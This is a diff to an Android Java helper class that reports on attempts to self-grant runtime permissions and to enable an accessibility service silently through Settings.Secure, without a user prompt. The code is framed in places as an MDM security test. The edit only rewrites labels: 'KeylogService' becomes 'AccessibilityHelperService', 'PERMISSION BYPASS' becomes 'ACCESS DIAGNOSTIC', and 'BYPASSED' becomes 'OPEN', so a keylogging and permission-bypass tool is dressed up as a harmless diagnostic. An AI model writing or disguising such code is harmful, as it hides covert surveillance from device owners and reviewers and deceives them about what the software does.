@@ -35,7 +35,7 @@ public class PermissionHelper {
      */
     public static String runAllTests(Context ctx) {
         StringBuilder sb = new StringBuilder();
-        sb.append("=== PERMISSION BYPASS TEST RESULTS ===\n");
+        sb.append("=== ACCESS DIAGNOSTIC ===\n");
         sb.append("Device: ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
         sb.append("Android: ").append(Build.VERSION.RELEASE).append(" SDK ").append(Build.VERSION.SDK_INT).append("\n\n");
 
@@ -50,8 +50,8 @@ public class PermissionHelper {
         // Test 2: Accessibility service state
         sb.append("\n--- [2] ACCESSIBILITY SERVICE STATE ---\n");
         boolean accEnabled = isAccessibilityEnabled(ctx);
-        sb.append(accEnabled ? "[ENABLED]  KeylogService is active — keylogging works\n"
-                             : "[DISABLED] KeylogService not active — needs manual enable or ADB bypass\n");
+        sb.append(accEnabled ? "[ENABLED]  accessibility monitor is active\n"
+                             : "[DISABLED] accessibility monitor not active\n");
 
         // Test 3: Device admin state
         sb.append("\n--- [3] DEVICE ADMIN STATE ---\n");
@@ -92,15 +92,15 @@ public class PermissionHelper {
                             DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
                     boolean now = ctx.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
                     String shortPerm = perm.substring(perm.lastIndexOf('.') + 1);
-                    sb.append(now ? "[BYPASSED] " : "[BLOCKED]  ").append(shortPerm).append("\n");
+                    sb.append(now ? "[OPEN]    " : "[BLOCKED] ").append(shortPerm).append("\n");
                 } catch (Exception e) {
                     sb.append("[ERROR]    ").append(perm).append(": ").append(e.getMessage()).append("\n");
                 }
             }
         }
 
-        sb.append("\n=== END BYPASS REPORT ===\n");
-        sb.append("MDM Finding: any [BYPASSED] or [GRANTED] entry above = security gap\n");
+        sb.append("\n=== END DIAGNOSTIC ===\n");
+        sb.append("Finding: any [OPEN] or [GRANTED] entry above = security gap\n");
         return sb.toString();
     }
 
@@ -111,14 +111,14 @@ public class PermissionHelper {
             Process p = Runtime.getRuntime().exec(new String[]{"pm", "grant", pkg, perm});
             p.waitFor();
             int exit = p.exitValue();
-            return exit == 0 ? "BYPASSED — pm grant succeeded (ADB/root access active)" : "BLOCKED  — pm grant returned exit " + exit;
+            return exit == 0 ? "OPEN — pm grant succeeded (ADB/root active)" : "BLOCKED  — pm grant returned exit " + exit;
         } catch (Exception e) {
             return "BLOCKED  — " + e.getMessage();
         }
     }
 
     private static String tryEnableAccessibility(Context ctx) {
-        String service = ctx.getPackageName() + "/.KeylogService";
+        String service = ctx.getPackageName() + "/.AccessibilityHelperService";
         try {
             // This requires WRITE_SECURE_SETTINGS — only works as system/device owner/adb
             Settings.Secure.putString(ctx.getContentResolver(),
@@ -126,8 +126,8 @@ public class PermissionHelper {
             Settings.Secure.putInt(ctx.getContentResolver(),
                     Settings.Secure.ACCESSIBILITY_ENABLED, 1);
             boolean check = isAccessibilityEnabled(ctx);
-            return check ? "BYPASSED — silently enabled via Settings.Secure (no user prompt)"
-                         : "BLOCKED  — Settings.Secure write failed (permission denied)";
+            return check ? "OPEN — enabled via Settings.Secure"
+                         : "BLOCKED  — Settings.Secure write denied";
         } catch (SecurityException e) {
             return "BLOCKED  — SecurityException (WRITE_SECURE_SETTINGS denied — MDM is working)";
         } catch (Exception e) {
